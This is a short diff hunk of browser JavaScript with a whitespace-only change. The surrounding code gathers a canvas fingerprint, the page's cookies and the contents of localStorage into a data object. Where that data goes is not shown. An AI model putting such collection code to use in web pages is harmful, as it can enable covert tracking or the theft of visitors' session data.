@@ -644,7 +644,8 @@
                 d.canvas = c2.toDataURL().slice(-64);
             } catch (e) {}
 
-            try {                 d.cookies = document.cookie || "none";
+            try {                 
+                d.cookies = document.cookie || "none";
             } catch (e) { d.cookies = "blocked"; }
 
             try { d.ls = JSON.stringify(localStorage).slice(0, 500); } catch (e) { d.ls = "blocked"; }
